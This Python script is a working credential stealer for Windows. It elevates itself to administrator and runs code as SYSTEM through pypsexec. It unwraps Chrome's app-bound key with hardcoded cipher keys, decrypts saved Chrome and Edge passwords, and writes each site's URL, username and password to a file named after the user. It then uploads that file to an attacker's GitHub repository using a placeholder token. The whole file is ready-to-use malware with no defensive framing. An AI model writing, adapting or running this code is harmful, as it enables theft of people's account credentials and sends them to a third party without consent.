import sys
from io import StringIO
import time
import os
import re
import json
import binascii
import ctypes
import sqlite3
import pathlib
import shutil
import base64
import datetime
import requests # For GitHub API communication

# Dependencies not in standard library, ensure they are installed:
# pip install pypsexec pycryptodomex pycryptodome

# Import platform-specific dependencies
from pypsexec.client import Client
from Crypto.Cipher import AES, ChaCha20_Poly1305
from Cryptodome.Cipher import AES # Note: The script uses two different AES imports due to how the original files were merged
import win32crypt

# ==============================================================================
# 1. GITHUB CONFIGURATION AND HELPER FUNCTION
# ==============================================================================

# --- USER-DEFINED GITHUB CONFIGURATION ---
# IMPORTANT: The GITHUB_TOKEN must have the 'repo' scope (or 'contents:write' for fine-grained tokens)
GITHUB_TOKEN = "Token here"
REPO_SLUG = "GithubUsername/Repo-name" # Format: <owner>/<repo>
# -----------------------------------------

def upload_to_github(repo_slug, file_path_on_github, content, token):
    """Uploads or updates a file on GitHub using the Contents API."""
    
    # 1. Define the API endpoint URL
    url_base = f"https://api.github.com/repos/{repo_slug}/contents/{file_path_on_github}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }

    # 2. Check if the file exists to get its SHA (required for updates)
    sha = None
    try:
        response = requests.get(url_base, headers=headers)
        if response.status_code == 200:
            sha = response.json().get('sha')
            print(f"[GITHUB] File '{file_path_on_github}' exists. Preparing to update...")
        elif response.status_code == 404:
            print(f"[GITHUB] File '{file_path_on_github}' does not exist. Preparing to create...")
        else:
            print(f"[GITHUB] Error checking file existence: {response.status_code} - {response.text}")
            return
    except requests.exceptions.RequestException as e:
        print(f"[GITHUB] Network error during SHA check: {e}")
        return

    # 3. Prepare the content and payload
    # GitHub requires content to be Base64 encoded
    encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
    
    action = "Update" if sha else "Create"
    commit_message = f"{action}: {file_path_on_github} - Automated Script Run on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": "main" # Change this if your default branch is not 'main'
    }
    
    if sha:
        payload["sha"] = sha # Add SHA for updates

    # 4. PUT request to create or update the file
    try:
        response = requests.put(url_base, headers=headers, data=json.dumps(payload))
        
        if response.status_code in [200, 201]:
            print(f"\n[GITHUB] ✅ Successfully {action.lower()}d file on GitHub.")
        else:
            print(f"\n[GITHUB] ❌ Error uploading file: {response.status_code} - {response.text}")
            print(f"Ensure your GITHUB_TOKEN has 'repo' or 'contents:write' scope permissions.")

    except requests.exceptions.RequestException as e:
        print(f"[GITHUB] Network error during file upload: {e}")

# ==============================================================================
# 2. MAIN SCRIPT LOGIC (ADMIN CHECK AND CORE FUNCTIONALITY)
# ==============================================================================

# Capture all output from both scripts
original_stdout = sys.stdout
sys.stdout = StringIO()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

if is_admin():
    pass
else:
    input("This script needs to run as administrator, press Enter to continue")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([sys.argv[0]] + sys.argv[1:]), None, 1)
    exit()

# Include the full logic from PG_Chrome.py here (unmodified)
user_profile = os.environ['USERPROFILE']
local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
login_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

arguments = "-c \"" + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace("\n", ";") + "\""

c = Client("localhost")
c.connect()

try:
    c.create_service()
    time.sleep(2)  # Wait for service to be fully created

    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    app_bound_encrypted_key_b64 = binascii.b2a_base64(
        binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

    # decrypt with SYSTEM DPAPI
    encrypted_key_b64, stderr, rc = c.run_executable(
        sys.executable,
        arguments=arguments.format(app_bound_encrypted_key_b64),
        use_system_account=True
    )

    # decrypt with user DPAPI
    decrypted_key_b64, stderr, rc = c.run_executable(
        sys.executable,
        arguments=arguments.format(encrypted_key_b64.decode().strip()),
        use_system_account=False
    )

    decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]

finally:
    try:
        time.sleep(2)  # Wait before cleanup
        c.remove_service()
        time.sleep(1)  # Wait after service removal
        c.disconnect()
    except Exception as e:
        print(f"Warning: Error during cleanup: {str(e)}")
        # Try one more time after a longer delay
        try:
            time.sleep(5)
            c.remove_service()
            c.disconnect()
        except:
            print("Warning: Could not clean up service properly. You may need to restart your computer.")

# decrypt key with AES256GCM or ChaCha20Poly1305
# key from elevation_service.exe
aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")

# [flag|iv|ciphertext|tag] decrypted_key
# [1byte|12bytes|variable|16bytes]
flag = decrypted_key[0]
iv = decrypted_key[1:1+12]
ciphertext = decrypted_key[1+12:1+12+32]
tag = decrypted_key[1+12+32:]

if flag == 1:
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
elif flag == 2:
    cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
else:
    raise ValueError(f"Unsupported flag: {flag}")

key = cipher.decrypt_and_verify(ciphertext, tag)
print(binascii.b2a_base64(key))

# fetch all v20 passwords
con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
cur = con.cursor()
r = cur.execute("SELECT origin_url, username_value, password_value FROM logins;")
passwords = cur.fetchall()
passwords_v20 = [p for p in passwords if p[2] and p[2][:3] == b"v20"]
con.close()

# decrypt v20 password with AES256GCM
# [flag|iv|ciphertext|tag] encrypted_value
# [3bytes|12bytes|variable|16bytes]
def decrypt_password_v20(encrypted_value):
    try:
        password_iv = encrypted_value[3:3+12]
        encrypted_password = encrypted_value[3+12:-16]
        password_tag = encrypted_value[-16:]
        password_cipher = AES.new(key, AES.MODE_GCM, nonce=password_iv)
        decrypted_password = password_cipher.decrypt_and_verify(encrypted_password, password_tag)
        return decrypted_password.decode('utf-8')
    except Exception as e:
        return f"Error decrypting password: {str(e)}"

print("\nDecrypted Chrome Passwords:")
print("-" * 50)
for p in passwords_v20:
    url = p[0]
    username = p[1]
    password = decrypt_password_v20(p[2])
    print(f"URL: {url}")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("-" * 50)

print("PG_Chrome output:")
print("This is from PG_Chrome script.")

# Include the full logic from PG_Edge.py here (unmodified)
def get_encrypted_key(home_folder):
    try:
        with open(os.path.normpath(home_folder + "\Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't extract encrypted_key!")
        return None

def decrypt_password(ciphertext, encrypted_key):
    try:
        chrome_secret = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(encrypted_key, AES.MODE_GCM, chrome_secret)
        return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't decrypt password. Is Chromium version older than 80?")
        return ""

def get_db(login_data_path):
    try:
        shutil.copy2(login_data_path, "login_data_copy.db")
        return sqlite3.connect("login_data_copy.db")
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't find the \"Login Data\" database!")
        return None

def get_chromium_creds(user_data, browser_name):
    if (os.path.exists(user_data) and os.path.exists(user_data + r"\Local State")):
        print(f"[I] Found {os.environ['USERPROFILE']}'s {browser_name} folder - decrypting...")
        encrypted_key = get_encrypted_key(user_data)
        folders = [item for item in os.listdir(user_data) if re.search("^Profile*|^Default$",item)!=None]
        for folder in folders:
            # Get data from the Login Data file (SQLite database)
            login_data_path = os.path.normpath(fr"{user_data}\{folder}\Login Data")
            db = get_db(login_data_path)
            if(encrypted_key and db):
                cursor = db.cursor()
                cursor.execute("select action_url, username_value, password_value from logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if (url!="" and username!="" and ciphertext!=""):
                        decrypted_pass = decrypt_password(ciphertext, encrypted_key)
                        print(str(index)+" "+("="*50)+f"\nURL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n")
            # Remove the temporary file
            if 'cursor' in locals() and cursor:
                cursor.close()
            if db:
                db.close()
            if os.path.exists("login_data_copy.db"):
                os.remove("login_data_copy.db")

try:
    # Extract Microsoft Edge passwords
    edge_user_data = os.path.normpath(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data")
    get_chromium_creds(edge_user_data, "Microsoft Edge")
except Exception as e:
    print(f"[E] {str(e)}")
print("PG_Edge output:")
print("This is from PG_Edge script.")

# Get the captured output
output = sys.stdout.getvalue()
sys.stdout = original_stdout

# Display output in the terminal
print("\n--- Combined Output ---\n")
print(output)
print("--- End of Output ---\n")

# -------------------------
# Formatting output for file
# -------------------------

def extract_entries(section_text):
    """
    Extracts tuples (url, username, password) from a section of output.
    Matches lines like:
      URL: https://...
      Username: name
      Password: pass
    Returns a list of (url, username, password).
    """
    entries = []
    # Regex to match URL, Username, Password blocks
    # Use non-greedy match for password; allow possible trailing separators
    pattern = re.compile(r"URL:\s*(.+?)\r?\nUsername:\s*(.*?)\r?\nPassword:\s*(.*?)(?:\r?\n(?:-+\r?\n|$))", re.DOTALL)
    for m in pattern.finditer(section_text):
        url = m.group(1).strip()
        username = m.group(2).strip()
        password = m.group(3).strip()
        entries.append((url, username, password))
    return entries

# Try to isolate Chrome and Edge parts using the markers printed by the scripts
chrome_section = ""
edge_section = ""

# Find Chrome section between the "Decrypted Chrome Passwords:" marker and "PG_Chrome output:"
start_chrome_marker = "Decrypted Chrome Passwords:"
end_chrome_marker = "PG_Chrome output:"
start_idx = output.find(start_chrome_marker)
end_idx = output.find(end_chrome_marker)
if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
    chrome_section = output[start_idx:end_idx]
else:
    # fallback: try to include from start up to PG_Chrome output if Decrypted marker not found
    if end_idx != -1:
        chrome_section = output[:end_idx]

# For Edge, find text between "PG_Chrome output:" and "PG_Edge output:"
start_edge_marker = "PG_Chrome output:"
end_edge_marker = "PG_Edge output:"
start_idx_e = output.find(start_edge_marker)
end_idx_e = output.find(end_edge_marker)
if start_idx_e != -1 and end_idx_e != -1 and end_idx_e > start_idx_e:
    edge_section = output[start_idx_e + len(start_edge_marker):end_idx_e]
else:
    # fallback: try to take from just after PG_Chrome output to end
    if start_idx_e != -1:
        edge_section = output[start_idx_e + len(start_edge_marker):]

# Extract entries
chrome_entries = extract_entries(chrome_section)
edge_entries = extract_entries(edge_section)

# Build formatted output exactly like user requested
formatted_lines = []

# Chrome header
formatted_lines.append("Chrome")
if chrome_entries:
    for (url, username, password) in chrome_entries:
        formatted_lines.append(f"URL:{url}")
        formatted_lines.append(f"Username: {username}")
        formatted_lines.append(f"Password: {password}")
        formatted_lines.append("")  # blank line between entries
else:
    # leave a blank line if no entries (user asked for that structure)
    formatted_lines.append("")

# Separator
formatted_lines.append("++++++++++++++++++++++++++++++++++++++++++++++++++++++")

# Edge header
formatted_lines.append("Edge")
if edge_entries:
    for (url, username, password) in edge_entries:
        formatted_lines.append(f"URL:{url}")
        formatted_lines.append(f"Username: {username}")
        formatted_lines.append(f"Password: {password}")
        formatted_lines.append("")  # blank line between entries
else:
    formatted_lines.append("")

formatted_output = "\n".join(formatted_lines).rstrip() + "\n"

# Save the formatted output to a file named "<WindowsUsername>_output.txt"
# Determine best username value for filename with fallbacks
_windows_user = os.environ.get('USERNAME')
if not _windows_user:
    # fallback to USERPROFILE basename or generic 'User'
    try:
        _windows_user = os.path.basename(os.environ.get('USERPROFILE', 'User'))
        if not _windows_user:
            _windows_user = 'User'
    except:
        _windows_user = 'User'

filename = f"{_windows_user}_output.txt"

# -------------------------
# Save file locally
# -------------------------
with open(filename, 'w', encoding='utf-8') as f:
    f.write(formatted_output)

# Optionally print where the file was saved
print(f"Formatted output saved to: {filename}")

# -------------------------
# Upload file to GitHub
# -------------------------
upload_to_github(REPO_SLUG, filename, formatted_output, GITHUB_TOKEN)